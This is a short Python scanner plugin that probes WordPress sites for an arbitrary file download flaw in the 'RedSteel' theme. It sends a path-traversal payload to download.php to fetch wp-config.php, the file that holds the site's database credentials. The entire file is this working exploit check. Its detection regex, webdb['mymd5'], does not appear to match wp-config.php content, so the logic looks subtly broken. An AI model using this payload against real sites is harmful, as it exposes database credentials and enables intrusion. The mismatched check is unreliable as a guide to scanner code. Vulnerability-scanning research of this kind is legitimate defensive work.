#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Wordpress RedSteel Theme Arbitrary File Download
#url + /wp-content/themes/RedSteel/download.php?file=../../../wp-config.php

import  re

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    url = arg
    payload = '/wp-content/themes/RedSteel/download.php?file=../../../wp-config.php'
    verify_url = url + payload
    code, head, res, errcode, _ = curl.curl(verify_url)
    reg = re.compile("webdb\['mymd5'\]")
    if reg.findall(res):
        security_hole(verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])